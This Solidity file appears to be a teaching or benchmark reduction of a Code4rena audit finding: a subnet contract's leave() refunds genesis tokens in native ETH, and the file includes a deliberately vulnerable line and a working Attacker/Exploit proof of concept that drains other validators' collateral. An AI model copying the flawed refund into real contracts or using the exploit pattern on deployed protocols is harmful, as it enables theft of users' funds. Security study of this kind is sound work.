// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Recall — [H-05] Incorrect supply fund transferral in leave()
    (Code4rena 2025-02-recall; #65092)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: when refunding genesisBalance on pre-bootstrap leave(),
    the code calls collateralSource.transferFunds instead of
    supplySource.transferFunds. With ERC20 supply and native ETH collateral,
    the leaver receives ETH equal to the genesis token amount instead of the
    tokens — draining other validators' locked collateral.
    Blamed transfer line preserved (@> VULN).
    Source: code-423n4/2025-02-recall@ab5f90b9 SubnetActorManagerFacet.sol */

contract MockERC20 {
    string public name = "Supply";
    string public symbol = "SUP";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Minimal Asset-style transfer: Native = ETH call, ERC20 = token.transfer.
library AssetLib {
    enum Kind {
        Native,
        ERC20
    }

    struct Asset {
        Kind kind;
        address token;
    }

    function transferFunds(Asset memory asset, address payable recipient, uint256 value) internal returns (bool) {
        if (asset.kind == Kind.Native) {
            require(address(this).balance >= value, "NotEnoughBalance");
            (bool success, ) = recipient.call{value: value}("");
            return success;
        } else {
            return MockERC20(asset.token).transfer(recipient, value);
        }
    }

    function lock(Asset memory asset, uint256 value) internal {
        if (asset.kind == Kind.ERC20) {
            MockERC20(asset.token).transferFrom(msg.sender, address(this), value);
        } else {
            require(msg.value >= value, "eth");
        }
    }
}

/// @dev Reduced SubnetActorManagerFacet leave / preFund / join surface.
contract SubnetActor {
    using AssetLib for AssetLib.Asset;

    bool public bootstrapped;
    AssetLib.Asset public collateralSource; // Native ETH
    AssetLib.Asset public supplySource; // ERC20
    mapping(address => uint256) public genesisBalance;
    mapping(address => uint256) public collateral;
    uint256 public genesisCircSupply;
    uint256 public totalCollateral;

    constructor(address supplyToken) {
        collateralSource = AssetLib.Asset({kind: AssetLib.Kind.Native, token: address(0)});
        supplySource = AssetLib.Asset({kind: AssetLib.Kind.ERC20, token: supplyToken});
    }

    receive() external payable {}

    function preFund(uint256 amount) external {
        require(!bootstrapped, "bootstrapped");
        require(amount > 0, "zero");
        supplySource.lock(amount);
        genesisBalance[msg.sender] += amount;
        genesisCircSupply += amount;
    }

    function join() external payable {
        require(msg.value > 0, "zero");
        require(collateral[msg.sender] == 0, "joined");
        collateral[msg.sender] = msg.value;
        totalCollateral += msg.value;
    }

    /// @notice Reduced leave() — only the pre-bootstrap branch (bug surface).
    function leave() external {
        uint256 amount = collateral[msg.sender];
        require(amount > 0, "NotValidator");

        if (!bootstrapped) {
            // check if the validator had some initial balance and return it if not bootstrapped
            uint256 genesisBal = genesisBalance[msg.sender];
            if (genesisBal != 0) {
                delete genesisBalance[msg.sender];
                genesisCircSupply -= genesisBal;
                // ----> vulnerable line (should be supplySource)
                collateralSource.transferFunds(payable(msg.sender), genesisBal); // @> VULN: refunds genesis via collateralSource (ETH) not supplySource (ERC20)
                // FIX: supplySource.transferFunds(payable(msg.sender), genesisBal);
            }

            // interaction must be performed after checks and changes
            totalCollateral -= amount;
            collateral[msg.sender] = 0;
            collateralSource.transferFunds(payable(msg.sender), amount);
            return;
        }
        collateral[msg.sender] = 0;
    }
}

/// @dev Attacker contract that preFunds SUP, joins with min ETH, leaves, receives stolen ETH.
contract Attacker {
    SubnetActor public actor;
    MockERC20 public supply;

    constructor(SubnetActor a, MockERC20 s) {
        actor = a;
        supply = s;
    }

    receive() external payable {}

    function attack(uint256 genesisAmt, uint256 stake) external {
        supply.approve(address(actor), genesisAmt);
        actor.preFund(genesisAmt);
        actor.join{value: stake}();
        actor.leave();
    }
}

contract Exploit {
    MockERC20 public supply; // CREATE 1
    SubnetActor public actor; // CREATE 2
    Attacker public attacker; // CREATE 3

    uint256 public constant GENESIS = 10 ether;
    uint256 public constant MIN_STAKE = 1 wei;
    uint256 public constant OTHER_COLLATERAL = 20 ether;

    constructor() payable {
        supply = new MockERC20();
        actor = new SubnetActor(address(supply));
        attacker = new Attacker(actor, supply);
    }

    function run() external payable {
        require(msg.value >= OTHER_COLLATERAL + MIN_STAKE, "need ETH");
        // Other validators' locked ETH collateral sits in the subnet actor.
        (bool ok, ) = address(actor).call{value: OTHER_COLLATERAL}("");
        require(ok, "fund actor");

        // Mint SUP to attacker for genesis deposit.
        supply.mint(address(attacker), GENESIS);
        // Fund attacker with min stake.
        (bool ok2, ) = address(attacker).call{value: MIN_STAKE}("");
        require(ok2, "fund attacker");

        uint256 ethBefore = address(attacker).balance;
        attacker.attack(GENESIS, MIN_STAKE);

        // Harm: attacker received GENESIS ETH (wrong asset) + stake refund,
        // while SUP remains locked in the actor. Net ETH profit ≈ GENESIS.
        uint256 ethAfter = address(attacker).balance;
        require(ethAfter >= ethBefore + GENESIS, "stolen ETH");
        require(supply.balanceOf(address(actor)) == GENESIS, "SUP stuck");
        require(supply.balanceOf(address(attacker)) == 0, "no SUP refund");
        require(address(actor).balance == OTHER_COLLATERAL - GENESIS, "actor drained by genesis units");
    }

    receive() external payable {}
}
